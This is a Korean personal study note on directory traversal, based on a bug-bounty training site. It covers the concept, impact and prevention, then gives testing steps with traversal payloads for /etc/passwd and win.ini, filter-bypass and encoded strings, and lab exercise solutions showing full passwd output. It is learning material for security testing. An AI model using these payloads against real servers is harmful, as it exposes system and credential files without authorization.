# Directory Traversal (디렉터리 순회)

개인 공부용으로 참고하기 위해서 버그바운티 클럽의 Pentest Gym에서 퍼온 사진과 글을 참고하여 정리한 문서입니다. 

| 출처 : https://www.bugbountyclub.com/pentestgym/view/50

# 디렉터리 순회란?
디렉터리 순회(Directory Traversal)는 사용자가 조작할 수 있는 입력이 웹 애플리케이션 서버의 파일 시스템에 전달되고, 안전하지 않은 방식으로 사용될 때 발생되는 취약점이다. 공격자는 조작 가능한 매개변수에 ../ 또는 ..\ 와 같은 경로 이동 문자를 사용하여 웹 루트 디렉터리(웹 애플리케이션의 최상위 디렉터리)를 벗어나 접근이 제한된 디렉터리에 접근하여 민감하거나 열람되어서는 안되는 디렉터리 파일을 열람할 수 있게 된다. (ex. /etc/passwd)

# 디렉터리 순회 취약점의 동작 원리
다음과 같은 filename 이라는 GET 매개변수를 이용해 동적으로 웹 페이지를 반환하는 http://example.com이 있다고 가정
```bash
http://example.com?filename=intro.php
```
위 요청을 받은 웹 애플리케이션은 filename 매개변수에 지정된 파일명을 서버 파일 시스템의 웹 루트 디렉터리에서 검색하여 존재할 수 있는 해당 파일의 내용을 보여준다. intro.php 는 웹 루트 디렉터리에 존재한다고 가정했을때, 다음과 같은 동작이 일어난다
![](https://www.bugbountyclub.com/uploads/images/training/1616545578.png)

example.com은 개발자의 실수로 인해 디렉터리 순회 공격에 취약하다. 공격자는 filename 매개변수를 이용하여 임의로 조작된 공격 문자열을 보내고 공격자에게 접근 권한이 없는 디렉터리에 액세스 할 수 있게 된다.

디렉터리 순회 시퀀스를 시스템의 루트 디렉터리까지 이동할 만큼 충분한 횟수 만큰 연속으로 사용(../../../../../../)하면 웹 루트 디렉터리를 벗어나 최종적으로 대상 호스트 서버의 루트 디렉터리까지 접근이 가능하게 된다. 공격자는 웹 서버를 구동하는 사용자 계정에 권한이 있는 디렉토리의 내용과 파일에 대해 접근할 수 있으며, 리눅스 운영체제에서 사용자에 관한 정보가 저장되어있는 `/etc/passwd` 파일을 읽기 위해 다음과 같이 조작된 URL을 사용할 수 있다.
```
http://example.com?filename=../../../../etc/passwd
```
![](https://www.bugbountyclub.com/uploads/images/training/1616545747.png)

# 디렉터리 순회 취약점의 영향
웹 애플리케이션을 구동하는 Apache 등의 웹 서버의 사용자 계정에 적용된 ACL(Access Control List, 접근 제어 목록)에 영향을 받는다.
- 서버의 디렉터리, 파일에 접근 가능하여 서버의 디렉터리 구조가 공개됨
- 서버에서 구동중인 Apache 또는 기타 다른 서비스의 설정 파일 접근을 통해 중요한 정보가 유출되고 공격자는 공격에 필요한 추가적인 정보를 획득하거나 다른 서비스로 공격을 확대할 수 있다
- bash_history 파일 접근을 통해 사용자가 실행했던 명령어 목록에서 데이터베이스 접속 정보들의 민감한 정보를 획득할 수 있다
- 제한적인 경우이지만 웹 애플리케이션의 파일 업로드 기능이 디렉터리 순회 공격에 취약한 경우, 공격자는 파일 업로드되는 경로를 조작해 서버의 임의의 경로에 파일(웹쉘)을 업로드할 수 있고 원격코드 실행에 노출된다.

# 디렉터리 순회 예방
가장 좋은 방법은 서버의 파일 시스템으로 전달되는 파일이나 디렉터리에 대한 요청을 허용하지 않는 것이다. 하지만 부득이하게 허용해야한다면 공격을 어렵게 만들기 위해 다음과 같은 방법을 복합적으로 적용해야한다.

1. 입력 유효성 검사 적용
파일, 디렉터리에 대한 요청을 허용할 경우 요청된 파일명에 상위 디렉터리, 홈 디렉터리와 같은 디렉터리 순회 시퀀스나 NULL byte가 존재하는지 검증하고 제거한다.
디렉터리 순회 시퀀스를 제거할 때는 공격자가 로직의 결함을 이용해 약간 변형된 공격 문자열(....//)을 사용할 수 있으므로 재귀적으로 완전히 제거해야한다.
또한 공격 문자열이 URL 인코딩이나 다른 인코딩 형식으로 변형될 수 있으므로 가능한 모든 인코딩 형태의 공격 문자열을 검증해야한다

2. 인덱스를 통한 파일 참조
요청에 파일경로나 파일명을 직접 요청하도록 구현하지 않고, 특정 인덱스와 파일을 매핑하여 요청시에는 인덱스를 통해 요청되도록 구현한다. 예를 들어 some-file.html 파일의 인덱스를 3으로 별도로 관리하고, 요청할 때 example.com?fileidx=3 과 같은 형식을 사용한다. 유효하지 않은 인덱스에 의한 요청은 거부한다
```bash
example.com?filename=some-file.html   (X)
example.com?fileidx=3                 (O)
```

3. 최소 권한 적용
웹 애플리케이션을 구동하는 사용자 계정(www-data)이 불필요한 시스템 디렉터리나 파일에 접근할 수 없도록 권한을 최소화 한다.

4. 서버 패치
웹 서버, 운영체제 등을 항상 최신 버전으로 유지한다

5. 웹 방화벽(WAF)을 사용하는 등의 보호 대책을 통해 보안을 강화한다.

# Path Tracersal 테스트 방법

## 1. 파일 시스템과 연결된 요청 탐색
대상 웹 애플리케이션에서 파일을 처리하는 모든 요청을 찾는다

1. 파일 업로드/다운로드 기능은 반드시 점검한다.
2. GET 매개변수, URL 경로, POST Body 데이터, 요청 헤더(Cookie 등)를 통해 웹 페이지나 스타일시트, 템플릿 들의 설정을 동적으로 로드하는 요청이 있는지 점검한다
- GET 매개변수
```
http://www.target.com/view.php?file=some-file.html
```
- URL 경로
```
http://www.target.com/download/some-file.pdf
```
- POST Body 데이터
```
POST /getcontents HTTP/1.1
Host: www.target.com
...생략...

filename=some-file.html
```
- Cookie 요청 헤더를 통한 템플릿 동적 생성
```
Cookie: bbc_id=bcae2ff6d760458ebbee5b48df22150c; bbc_asx=1245431 ; bbc_template=some-template
```
3. 요청에 파일명이나 디렉터리명이 사용된 요청을 찾는다. 가령 이미지 파일이나 보고서 등의 PDF 파일을 가져와 웹 브라우저에 로딩하는 경우가 해당된다.

##  2. 디렉터리 순회 공격에 취약한지 점검
의심되는 요청을 찾았다면 디렉터리 순회 시퀀스를 이용해 `/etc/passwd` 또는 `win.ini` 파일을 읽을 수 있는지 확인한다.
- 리눅스/유닉스 계열 (/etc/passwd)
```
http://www.target.com/view.php?file=../../../../../etc/passwd
```
- 윈도우 (win.ini)
```
http://www.target.com/view.php?file=../../../../../windows/win.ini
http://www.target.com/view.php?file=..\..\..\..\..\windows\win.ini
```

웹 브라우저를 통해 해당 파일의 내용이 표시된다면 디렉터리 순회 공격에 취약한 것이다. 하지만 개발자가 디렉터리 순회 공격을 방어하기 위해서 사용자로부터 전달받은 데이터에 대한 유효성 검사를 할 경우 위와 같은 기본적인 방법은 차단 될 수 있으니, 필터 우회를 시도해야한다.

## 3. 유효성 검사 우회
안전하지 않은 방법으로 구현된 필터는 검증 로직의 결함을 파악하여 우회할 수 있다
../, ..\ 를 제거하도록 필터를 적용했으나, 재귀적으로 제거하지 않은 필터의 경우에는 다음과 같은 공격 문자열을 통해 우회를 시도한다
```
....//     -----필터----->     ../
..././     -----필터----->     ../
....\\     -----필터----->     ..\
...\.\     -----필터----->     ..\
....\/     -----필터----->     ../
..../\     -----필터----->     ..\
```
또는 각각의 문자를 다른 인코딩으로 변환하고 이를 조합한 공격 문자열을 통해 우회가 가능하다
- URL 인코딩
```
%2e%2e/%2e%2e%2f%252e%252e%252f%2e%2e\%2e%2e%5c%252e%252e%255c
```
- 16bit 유니코드 인코딩
```
%u002e%u002e/
%u002e%u002e%u2215
%u002e%u002e\
%u002e%u002e%u2216
```

# 실습 문제 풀이 
## Exercise 1
| Home, About 메뉴를 클릭하면 "page"라는 GET 매개변수를 통해 해당되는 파일명을 요청하고 파일의 내용을 웹 브라우저에 표시합니다. 

```
https://.../pathtrav_ex1.php?page=../../../../../../etc/passwd


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false

```

## Exercise 2
| 개발자가 "page" 매개변수에 대한 입력값 유효성 검사를 적용했습니다. 이제 1번 문제와 같은 기본 페이로드는 더 이상 사용할 수 없습니다.

```
https://.../pathtrav_ex2.php?page=....//....//....//....//....//etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false
```
## Exercise 3
| 이 문제는 "page" 매개변수의 값에 닷닷슬래시(../)와 닷닷백슬래시(..\)가 포함된 경우 제거하지 않고 요청을 차단합니다. 하지만 소스코드에는 사용자 입력에 대한 불필요한 URL 디코딩 작업이 남아있습니다.

```
https://.../pathtrav_ex3.php?page=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false
```
## Exercise 4
| 이 문제는 "page" 매개변수에 참조하려는 파일의 전체 경로를 사용합니다. 개발자는 디렉토리 순회 공격을 예방하기 위해 "page" 매개변수에 파일의 경로가 유효한 시작 경로가 아닌 경우 요청을 차단합니다. 

```
# 전
https://.../pathtrav_ex4.php?page=/var/www/html/pages/home.html

# 디렉터리 순회 공격
https://.../pathtrav_ex4.php?page=/var/www/html/pages/../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false
```



